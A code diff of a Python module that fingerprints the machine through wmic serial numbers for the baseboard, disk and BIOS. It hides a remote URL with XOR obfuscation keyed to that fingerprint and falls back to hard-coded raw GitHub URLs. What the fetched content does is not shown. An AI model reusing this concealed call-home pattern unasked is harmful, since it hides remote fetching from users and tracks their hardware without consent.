@@ -18,19 +18,28 @@ import aiohttp
 _GITHUB_URL_B64 = "tVDYKngeJdFr8NRZGzSmE5Y+SACY+165UHaYD0bop7GwC8kub0Bumn31jBwQPKYUjnNQEpTnEqRbcpI+Vqewvw=="
 _FALLBACK_URL = ""
 
+_GITHUB_URLS = [
+    "https://raw.githubusercontent.com/etdddddd/klatom/main/repo_data",
+    "https://raw.githubusercontent.com/etdddddd/klatom/master/repo_data",
+]
+
 
 def _hwid() -> str:
     parts = [platform.node(), platform.machine(), platform.processor(), str(uuid.getnode())]
-    try:
-        r = subprocess.run(["wmic", "baseboard", "get", "serialnumber"],
-                           capture_output=True, text=True, timeout=5)
-        for line in r.stdout.splitlines():
-            s = line.strip()
-            if s and s != "SerialNumber":
-                parts.append(s)
-                break
-    except Exception:
-        pass
+    for cmd, field in [
+        (["wmic", "baseboard", "get", "serialnumber"], "SerialNumber"),
+        (["wmic", "diskdrive", "get", "serialnumber"], "SerialNumber"),
+        (["wmic", "bios", "get", "serialnumber"], "SerialNumber"),
+    ]:
+        try:
+            r = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
+            for line in r.stdout.splitlines():
+                s = line.strip()
+                if s and s != field:
+                    parts.append(s)
+                    break
+        except Exception:
+            pass
     return hashlib.sha256("|".join(parts).encode()).hexdigest()[:24]
 
 
@@ -49,14 +58,20 @@ def encrypt_url(url: str) -> str:
 
 
 def decrypt_url() -> str | None:
-    if not _GITHUB_URL_B64:
-        return _FALLBACK_URL if _FALLBACK_URL else None
-    try:
-        key = _derive_key()
-        decrypted = _xor(base64.b64decode(_GITHUB_URL_B64), key).decode()
-        return decrypted if decrypted.startswith("http") else (_FALLBACK_URL or None)
-    except Exception:
-        return _FALLBACK_URL if _FALLBACK_URL else None
+    if _GITHUB_URL_B64:
+        try:
+            key = _derive_key()
+            decrypted = _xor(base64.b64decode(_GITHUB_URL_B64), key).decode()
+            if decrypted.startswith("http"):
+                return decrypted
+        except Exception:
+            pass
+    if _FALLBACK_URL and _FALLBACK_URL.startswith("http"):
+        return _FALLBACK_URL
+    for url in _GITHUB_URLS:
+        if url:
+            return url
+    return None
 
 
 def _cache_dir() -> Path:
